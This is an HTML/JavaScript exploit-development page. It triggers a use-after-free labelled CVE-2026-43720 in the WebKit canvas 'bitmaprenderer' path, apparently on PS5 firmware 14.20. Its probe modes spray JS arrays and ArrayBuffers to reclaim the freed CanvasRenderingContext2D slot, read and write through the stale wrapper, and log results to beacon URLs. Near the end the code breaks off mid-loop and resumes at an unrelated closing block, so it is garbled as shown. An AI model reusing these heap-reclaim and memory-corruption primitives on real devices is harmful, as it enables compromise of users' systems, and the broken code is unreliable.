<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V592 control</title></head>
<body><pre id="out">V592 — post-trigger control / reclaim probe</pre>
<script>
/* V592-ctl: same CVE-2026-43720 trigger as v592.html, then ONE controlled
 * action so we can tell WHY the post-trigger read dies on 14.20.
 *
 *   op=none            do nothing after the trigger (pure liveness control)
 *   op=ping            beacon immediately after the trigger (stage-1 equivalent)
 *   op=canvas          savedCtx.canvas.width   (is the wrapper object alive?)
 *   op=lw              savedCtx.lineWidth      (crash baseline)
 *   op=reclaimctx&n=N  allocate N fresh 2d contexts (unique state), then read
 *                      the stale lineWidth: 4.5678 => same-type reclaim worked
 *   op=sprayobj&len=N  spray N*8+8-byte JS double arrays at the freed CONTEXT
 *                      OBJECT slot; a hit makes lineWidth read 1.2345
 *   op=reclaim&len=N   spray JSArray butterflies of ~N*8+8 bytes into the
 *                      freed state-stack size class, THEN read lineWidth
 *
 * A pre-scheduled LATE timer is armed BEFORE the trigger, so "renderer still
 * alive" is reported without needing any allocation right after the trigger.
 *
 * All links should use once=1: after a renderer crash + auto-reload the guard
 * stops a second run, so you never get a crash/OOM loop.
 */
var PARAM = {};
try {
  var qs = location.search.replace(/^\?/, '');
  var parts = qs.split('&');
  for (var qi = 0; qi < parts.length; qi++) {
    if (!parts[qi]) continue;
    var kv = parts[qi].split('=');
    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
  }
} catch (e) {}

var OP = PARAM.op || 'none';
var LEN = parseInt(PARAM.len || '1849', 10);
var SPRAY_N = parseInt(PARAM.spray || '64', 10);
var ONCE = PARAM.once === '1';
var NORETRY = PARAM.noretry === '1';
/* fill=marker : every 8-byte slot = 9999.99 (0x40c3877c...) -> invalid pointer,
 *                so a hit faults and a read cannot tell hit from miss.
 * fill=zero   : leave the fresh ArrayBuffer zeroed (new ArrayBuffer is already
 *                zero-initialised) -> a hit reads lineWidth=0 safely, so the
 *                sweep never crashes and the TRY/STEP markers always land. */
var ABFILL = (PARAM.fill === 'zero') ? 'zero' : 'marker';
var O = document.getElementById('out');

function storage() {
  try { return window.sessionStorage; } catch (e) {}
  try { return window.localStorage; } catch (e) {}
  return null;
}

/* Guard helpers. The old code only touched whichever storage storage()
 * returned, so a RESET in one tab could not clear a guard another tab had
 * written to the other storage. Both storages are handled now. */
function eachStorage(fn) {
  try { if (window.sessionStorage) fn(window.sessionStorage); } catch (e) {}
  try { if (window.localStorage) fn(window.localStorage); } catch (e) {}
}
function guardRead(k) {
  var v = null;
  eachStorage(function (s) { try { if (v === null) v = s.getItem(k); } catch (e) {} });
  return v;
}
function guardWrite(k) {
  eachStorage(function (s) { try { s.setItem(k, '1'); } catch (e) {} });
}
function guardClear(k) {
  eachStorage(function (s) { try { s.removeItem(k); } catch (e) {} });
}
function guardClearAll() {
  var cleared = 0;
  var prefixes = ['v592c_', 'v592r_', 'v592w_', 'v592s_'];
  eachStorage(function (s) {
    try {
      var keys = [];
      for (var i = 0; i < s.length; i++) keys.push(s.key(i));
      for (var j = 0; j < keys.length; j++) {
        var k = keys[j];
        if (!k) continue;
        for (var p = 0; p < prefixes.length; p++) {
          if (k.indexOf(prefixes[p]) === 0) { s.removeItem(k); cleared++; break; }
        }
      }
    } catch (e) {}
  });
  return cleared;
}

var guardSuffix = '0';
if (OP === 'reclaim' || OP === 'sprayobj' || OP === 'probe') guardSuffix = String(LEN);
else if (OP === 'reclaimctx' || OP === 'reclaimread' || OP === 'tagctx') guardSuffix = String(PARAM.n || '32');
else if (OP === 'abalias' || OP === 'abdirect' || OP === 'abfake' || OP === 'direct') guardSuffix = String(PARAM.ablen || '768') + '_' + ABFILL + '_' + (OP === 'direct' ? 'direct' : (PARAM.lw ? String(PARAM.lw).replace(/\./g,'') : '0') + '_' + (PARAM.nowrite || '0'));
else if (OP === 'absweep') guardSuffix = (PARAM.lens ? String(PARAM.lens).replace(/,/g, '-') : 'def') + '_' + ABFILL;
var guardKey = 'v592c_' + OP + '_' + guardSuffix;
var GUARD_OFF = PARAM.guard === '0';
var BLOCKED = false;
var st = storage();
if (PARAM.reset === '1') guardClear(guardKey);
if (!GUARD_OFF && ONCE && OP !== 'abwalk' && OP !== 'abfakescan') {
  if (guardRead(guardKey) === '1') BLOCKED = true;
  else guardWrite(guardKey);
}

function say(s) { O.textContent += '\n' + s; }

function bk(tag, body) {
  var u = '/beacon/V592C-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 800)) + '&t=' + Date.now();
  try { new Image().src = u; } catch (e) {}
  if (!NORETRY) {
    setTimeout(function () { try { new Image().src = u + '&r=2'; } catch (e) {} }, 4000);
    setTimeout(function () { try { new Image().src = u + '&r=3'; } catch (e) {} }, 8000);
  }
}

/* Synchronous beacon: guarantees the log entry exists before the next line
 * runs, so a crash can never swallow the TRY marker of the size under test. */
function bks(tag, body) {
  var u = '/beacon/V592C-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 300)) + '&t=' + Date.now() + '&s=1';
  try {
    var x = new XMLHttpRequest();
    x.open('GET', u, false);
    x.send(null);
  } catch (e) {}
}

/* Pre-allocated readers (must exist before the trigger). */
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
function d2hex(d) {
  if (typeof d !== 'number') return String(d);
  f64[0] = d;
  var hi = u32[1], lo = u32[0];
  return '0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8);
}

var SAVES = 32;
var SAVE_N = (PARAM.saves === undefined) ? SAVES : parseInt(PARAM.saves, 10);

if (OP === 'resetall') {
  var cleared = guardClearAll();
  bk('RESET', 'cleared=' + cleared);
  say('Cleared ' + cleared + ' once-guard flags (both storages). Every probe link will run again.');
} else if (BLOCKED) {
  bk('BLOCKED', 'op=' + OP + ',len=' + LEN + ',once-guard');
  say('Blocked by once=1. Tap the RESET link in the index, or add reset=1.');
} else {
  /* Arm liveness timer BEFORE the trigger: no allocation is needed after it. */
  var lateFired = false;
  setTimeout(function () {
    lateFired = true;
    bk('LATE', 'op=' + OP + ',len=' + LEN + ',alive=1');
    say('LATE: renderer alive 1200ms after trigger');
  }, 1200);

  bk('BOOT', 'v592-ctl-op=' + OP + '-len=' + LEN);
  bk('CONFIG', 'op=' + OP + ',len=' + LEN + ',n=' + (PARAM.n || '32') + ',spray=' + SPRAY_N + ',saves=' + SAVE_N + ',ablen=' + (PARAM.ablen || '-') + ',fill=' + ABFILL);
  say('V592 ctl: op=' + OP + ' len=' + LEN + ' spray=' + SPRAY_N);

  var savedCtx = null;
  var canvas = document.createElement('canvas');
  canvas.width = 1;
  canvas.height = 1;
  document.body.appendChild(canvas);

  var dict = {};
  Object.defineProperty(dict, 'alpha', {
    get: function () {
      var ctx = canvas.getContext('2d');
      if (!ctx) return true;
      savedCtx = ctx;
      ctx.lineWidth = 3.14159;
      ctx.miterLimit = 7.77;
      ctx.globalAlpha = 0.42;
      ctx.lineDashOffset = 2.222;
      ctx.shadowBlur = 5.55;
      for (var i = 0; i < SAVE_N; i++) ctx.save();
      ctx.lineWidth = 1.0;
      return true;
    }
  });

  var bmpCtx = null;
  try { bmpCtx = canvas.getContext('bitmaprenderer', dict); }
  catch (e) { bk('ERR', 'bmr:' + e.name); }

  if (!savedCtx || !bmpCtx) {
    bk('ERR', 'no-ctx:inner=' + !!savedCtx + ',bmr=' + !!bmpCtx);
    say('ABORT: trigger failed');
  } else {
    /* ---- exactly one action, no allocations before a state read ---- */
    if (OP === 'none') {
      /* deliberately nothing here */
    } else if (OP === 'canvas') {
      var w = -1, ce = null;
      try { w = savedCtx.canvas.width; } catch (e) { ce = e.name; }
      bk('CREAD', 'canvas.width=' + w + (ce ? ',ERR=' + ce : ''));
    } else if (OP === 'lw') {
      var lw, le = null;
      try { lw = savedCtx.lineWidth; } catch (e) { le = e.name; }
      bk('RREAD', 'lw=' + d2hex(lw) + (le ? ',ERR=' + le : ''));
    } else if (OP === 'ping') {
      /* stage-1 equivalent on this page: prove the trigger returned and that
       * an allocation right after it is survivable. */
      bk('PING', 'trigger-returned');

    } else if (OP === 'direct') {
      /* Direct spray + read. Trigger already fired, savedCtx is alive (lw=3.14159).
       * Spray N ArrayBuffers of size ABLEN, then read lw through the stale wrapper.
       *   lw=9999.99 -> AB took the 768B slot
       *   lw=7777.77 or other -> AB missed, context still alive
       *   death/crash -> AB took slot but read faulted
       */
      var DN = parseInt(PARAM.n || '400', 10);
      var DBL = parseInt(PARAM.ablen || '768', 10);
      var dkeep = [];
      for (var di = 0; di < DN; di++) {
        var dab = new ArrayBuffer(DBL);
        if ((DBL & 7) === 0 && ABFILL === 'marker') {
          var dfv = new Float64Array(dab);
          for (var dk = 0; dk < (DBL >> 3); dk++) dfv[dk] = 9999.99;
        }
        dkeep[di] = dab;
      }
      canvas._direct = dkeep;
      bks('ABSPRAY', 'n=' + DN + ',len=' + DBL + ',direct=true');

      var drv = -1, dre = null;
      try { drv = savedCtx.lineWidth; } catch (e) { dre = e.name; }
      if (dre) {
        bk('RREAD', 'direct len=' + DBL + ',n=' + DN + ',ERR=' + dre);
      } else {
        bk('RREAD', 'direct len=' + DBL + ',n=' + DN + ',lw=' + drv + ',hex=' + d2hex(drv));
        var dwv = -1;
        try { savedCtx.lineWidth = 1234.5; dwv = savedCtx.lineWidth; } catch(e){}
        bks('ABWRITE', 'back=' + dwv + ',ok=' + (dwv === 1234.5 ? 1 : 0));
      }

    } else if (OP === 'reclaimctx') {
      /* Allocate N fresh 2d contexts (same type as the freed object) with a
       * unique state, then read the stale savedCtx.lineWidth. If we get
       * 4.5678 back, a new context landed in the freed slot and the stale
       * wrapper is usable again. If it crashes, the slot is not reclaimable
       * this way. */
      var N = parseInt(PARAM.n || '32', 10);
      var keep = new Array(N);
      var made = 0;
      for (var k = 0; k < N; k++) {
        var c2 = document.createElement('canvas');
        c2.width = 1; c2.height = 1;
        var cx = null;
        try { cx = c2.getContext('2d'); } catch (e) {}
        if (cx) {
          try {
            cx.lineWidth = 4.5678;
            cx.miterLimit = 8.88;
            cx.globalAlpha = 0.33;
            cx.lineDashOffset = 6.66;
            cx.shadowBlur = 9.99;
          } catch (e) {}
          keep[made++] = c2;
        }
      }
      var q = 0, qe = null;
      try { q = savedCtx.lineWidth; } catch (e) { qe = e.name; }
      canvas._keep = keep;
      bk('RREAD', 'ctxreclaim n=' + N + ',made=' + made + ',lw=' + d2hex(q) + (qe ? ',ERR=' + qe : ''));

    } else if (OP === 'reclaimread') {
      /* Read-only diagnostic: same-type reclaim (N fresh 2d contexts, each
       * tagged with a unique state), then read ALL five state fields through
       * the stale wrapper. This tells us whether the alias is complete
       * (every field matches the tagged value) or whether lineWidth just
       * happens to look right. No writes, no forging. */
      var RN = parseInt(PARAM.n || '32', 10);
      var rkeep = new Array(RN);
      var rmade = 0;
      for (var rk = 0; rk < RN; rk++) {
        var rc = document.createElement('canvas');
        rc.width = 1; rc.height = 1;
        var rcx = null;
        try { rcx = rc.getContext('2d'); } catch (e) {}
        if (rcx) {
          try {
            rcx.lineWidth = 4.5678;
            rcx.miterLimit = 8.88;
            rcx.globalAlpha = 0.33;
            rcx.lineDashOffset = 6.66;
            rcx.shadowBlur = 9.99;
          } catch (e) {}
          rkeep[rmade++] = rc;
        }
      }
      var rvals = [];
      var rerrs = [];
      var rnames = ['lw', 'ml', 'ga', 'ldo', 'sb'];
      try { rvals.push(d2hex(savedCtx.lineWidth)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
      try { rvals.push(d2hex(savedCtx.miterLimit)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
      try { rvals.push(d2hex(savedCtx.globalAlpha)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
      try { rvals.push(d2hex(savedCtx.lineDashOffset)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
      try { rvals.push(d2hex(savedCtx.shadowBlur)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
      canvas._keep = rkeep;
      var rline = 'reclaimread n=' + RN + ',made=' + rmade;
      for (var rq = 0; rq < rnames.length; rq++) {
        rline += ',' + rnames[rq] + '=' + rvals[rq] + (rerrs[rq] ? '!' + rerrs[rq] : '');
      }
      bk('RREAD', rline);

    } else if (OP === 'sweep') {
      /* One-tap size sweep. Each iteration gets a FRESH trigger, so a miss
       * does not poison the next test. A TRY beacon is sent before every
       * size, so if the renderer dies the last TRY in the log is the size
       * class that actually hit the freed object slot. */
      var list = String(PARAM.lens || '256,288,320,360,400,448,512,576,640,720,800,896,1024,1152,1280,1440,1600,1792,2000').split(',');
      var SM = parseInt(PARAM.spray || '24', 10);
      var SC = parseInt(PARAM.ctx || '24', 10);
      var allKeep = [];
      for (var li2 = 0; li2 < list.length; li2++) {
        var SL = parseInt(list[li2], 10);
        if (!SL) continue;
        bk('TRY', 'len=' + SL);

        var scv = document.createElement('canvas');
        scv.width = 1; scv.height = 1;
        document.body.appendChild(scv);
        var sinner = null;
        var sdict = {};
        Object.defineProperty(sdict, 'alpha', {
          get: function () {
            var c2 = scv.getContext('2d');
            if (!c2) return true;
            sinner = c2;
            c2.lineWidth = 3.14159;
            c2.miterLimit = 7.77;
            for (var s3 = 0; s3 < SAVES; s3++) c2.save();
            c2.lineWidth = 1.0;
            return true;
          }
        });
        var sbc = null;
        try { sbc = scv.getContext('bitmaprenderer', sdict); } catch (e) {}
        if (!sinner || !sbc) { bk('STEP', 'len=' + SL + ',notrigger'); continue; }

        /* 1. butterflies of this size class */
        var hh = new Array(SM);
        for (var mi = 0; mi < SM; mi++) {
          var bb = new Array(SL);
          for (var mj = 0; mj < SL; mj++) bb[mj] = 1.2345;
          hh[mi] = bb;
        }
        allKeep.push(hh);

        /* 2. real contexts, tagged, to take the slot if the spray missed */
        var kk = new Array(SC);
        for (var ci = 0; ci < SC; ci++) {
          var ccv = document.createElement('canvas');
          ccv.width = 1; ccv.height = 1;
          var ccx = null;
          try { ccx = ccv.getContext('2d'); } catch (e) {}
          if (ccx) { try { ccx.lineWidth = 200 + ci; } catch (e) {} }
          kk[ci] = ccv;
        }
        allKeep.push(kk);

        /* 3. one read */
        var srv = -1, sre = null;
        try { srv = sinner.lineWidth; } catch (e) { sre = e.name; }
        if (sre) bk('STEP', 'len=' + SL + ',ERR=' + sre);
        else if (srv === 1.2345) bk('STEP', 'len=' + SL + ',HIT=butterfly,lw=' + srv);
        else bk('STEP', 'len=' + SL + ',miss,lw=' + srv);
      }
      canvas._keep = allKeep;
      bk('SWEEPDONE', 'n=' + list.length);

    } else if (OP === 'abalias' || OP === 'abdirect') {
      /* Port of the documented 14.10 AB-reclaim recipe (V527 / V527b).
       *
       *   abdirect : trigger -> 400x ArrayBuffer(768) marker spray -> read lw
       *   abalias  : trigger -> same-type alias -> free the alias owner with a
       *              bitmaprenderer lever -> 400x ArrayBuffer(768) -> read lw
       *
       * CanvasRenderingContext2D is a 768-byte FastMalloc allocation. JSArray
       * butterflies live in JSC heaps (and are pinned by conservative GC), so
       * they can never land there -- that is why every butterfly/string spray
       * missed. ArrayBuffer backing stores share the FastMalloc heap on PS5
       * (gigacage disabled), so an ArrayBuffer(768) CAN take the slot.
       *
       *   9999.99 -> AB reclaimed the slot: byte control over the object
       *   7777.77 -> lever failed, stale wrapper still aliases a live context
       *   death   -> no reclaim (slot still free) or AB landed with a layout
       *              that faults on the first deref
       */
      var ABLEN = parseInt(PARAM.ablen || '768', 10);
      var ABN = parseInt(PARAM.abn || '400', 10);
      var absKeep = new Array(ABN);
      var aliasIdx = -1;

      if (OP === 'abalias') {
        var K = parseInt(PARAM.n || '64', 10);
        var sprayC = new Array(K);
        var sprayX = new Array(K);
        for (var ai = 0; ai < K; ai++) {
          var ac = document.createElement('canvas');
          ac.width = 8; ac.height = 8; ac.id = 'k' + ai;
          var ax = null;
          try { ax = ac.getContext('2d'); } catch (e) {}
          if (ax) { try { ax.lineWidth = 7777.77; } catch (e) {} }
          sprayC[ai] = ac; sprayX[ai] = ax;
        }
        canvas._alias = sprayC;
        canvas._aliasX = sprayX;

        var aid = '?';
        try { aid = savedCtx.canvas.id; } catch (e) { aid = 'ERR:' + e.name; }
        bk('ALIAS', 'id=' + aid);
        if (aid && aid.charAt(0) === 'k') aliasIdx = parseInt(aid.slice(1), 10);

        if (aliasIdx >= 0) {
          var LV = PARAM.lever || 'reentrant';
          var el = sprayC[aliasIdx];
          var via = 'none';
          try {
            if (LV === 'reentrant') {
              /* Re-run the SAME bug on the aliased canvas: the getter re-enters
               * getContext('2d') (returns the existing, aliased context), then
               * the outer bitmaprenderer call replaces m_context and frees it. */
              var dd = {};
              Object.defineProperty(dd, 'alpha', {
                get: function () {
                  try { el.getContext('2d'); } catch (e) {}
                  return true;
                }
              });
              el.getContext('bitmaprenderer', dd);
              via = 'reentrant';
            } else if (LV === 'width') {
              el.width = 16;
              via = 'width';
            } else {
              el.getContext('bitmaprenderer');
              via = 'bmr';
            }
            bk('LEVER', 'idx=' + aliasIdx + ',via=' + via);
          } catch (e) { bk('LEVER', 'ERR=' + e.name + ',idx=' + aliasIdx + ',via=' + LV); }
        } else {
          bk('LEVER', 'no-alias');
        }
      }

      for (var abi = 0; abi < ABN; abi++) {
        var ab = new ArrayBuffer(ABLEN);
        if (ABFILL === 'marker' && (ABLEN & 7) === 0) {
          var dv = new Float64Array(ab);
          var nslots = ABLEN >> 3;
          for (var sj2 = 0; sj2 < nslots; sj2++) dv[sj2] = 9999.99;
        }
        absKeep[abi] = ab;
      }
      canvas._abs = absKeep;
      bks('ABSPRAY', 'n=' + ABN + ',len=' + ABLEN + ',fill=' + ABFILL + ',alias=' + aliasIdx);

      var abr = -1, aber = null;
      try { abr = savedCtx.lineWidth; } catch (e) { aber = e.name; }
      if (aber) {
        bk('RREAD', 'ab ' + OP + ' len=' + ABLEN + ',fill=' + ABFILL + ',ERR=' + aber + ',alias=' + aliasIdx);
      } else {
        bk('RREAD', 'ab ' + OP + ' len=' + ABLEN + ',fill=' + ABFILL + ',lw=' + abr + ',hex=' + d2hex(abr) + ',alias=' + aliasIdx);
        if (ABFILL === 'marker' && abr === 9999.99) {
          var wrOk = 0;
          try { savedCtx.lineWidth = 1234.5; wrOk = (savedCtx.lineWidth === 1234.5) ? 1 : 0; } catch (e) {}
          bks('ABWRITE', 'ok=' + wrOk);
        }
      }

    } else if (OP === 'absweep') {
      /* AB size-class oracle. ArrayBuffer backing stores share the FastMalloc
       * heap on PS5 (gigacage disabled), so an AB can land in the freed 768B
       * CanvasRenderingContext2D slot. Same oracle as the butterfly sweeps:
       * spray ABs of this size, then 24 tagged real contexts, then one read.
       *   miss,ctx=200+i -> a real context won, AB size did not match
       *   HIT / death    -> the AB took the slot; last TRY gives the size
       */
      var alist = String(PARAM.lens || '96,128,160,192,224,256,288,320,352,384,416,448,480,512,576,640,704,768,832,896,960,1024,1152,1280,1536').split(',');
      var AM = parseInt(PARAM.spray || '32', 10);
      var AC = parseInt(PARAM.ctx || '24', 10);
      var ASTART = parseInt(PARAM.start || '0', 10);
      var akeep = [];
      for (var ali = 0; ali < alist.length; ali++) {
        var AL = parseInt(alist[ali], 10);
        if (!AL || AL < ASTART) continue;
        bks('TRY', 'ablen=' + AL + ',fill=' + ABFILL);

        var acv = document.createElement('canvas');
        acv.width = 1; acv.height = 1;
        document.body.appendChild(acv);
        var ainner = null;
        var adict = {};
        Object.defineProperty(adict, 'alpha', {
          get: function () {
            var c2 = acv.getContext('2d');
            if (!c2) return true;
            ainner = c2;
            c2.lineWidth = 3.14159;
            c2.miterLimit = 7.77;
            for (var s3 = 0; s3 < SAVE_N; s3++) c2.save();
            c2.lineWidth = 1.0;
            return true;
          }
        });
        var abc = null;
        try { abc = acv.getContext('bitmaprenderer', adict); } catch (e) {}
        if (!ainner || !abc) { bks('STEP', 'ablen=' + AL + ',notrigger'); continue; }

        /* 1. ArrayBuffer spray of exactly this size class */
        var aarr = new Array(AM);
        for (var aj = 0; aj < AM; aj++) {
          var abx = new ArrayBuffer(AL);
          if (ABFILL === 'marker' && (AL & 7) === 0) {
            var fv = new Float64Array(abx);
            for (var ak = 0; ak < (AL >> 3); ak++) fv[ak] = 9999.99;
          }
          aarr[aj] = abx;
        }
        akeep.push(aarr);

        /* 2. tagged real contexts */
        var akk = new Array(AC);
        for (var aci = 0; aci < AC; aci++) {
          var accv = document.createElement('canvas');
          accv.width = 1; accv.height = 1;

    say('done');
  }, 3000);
}
</script>
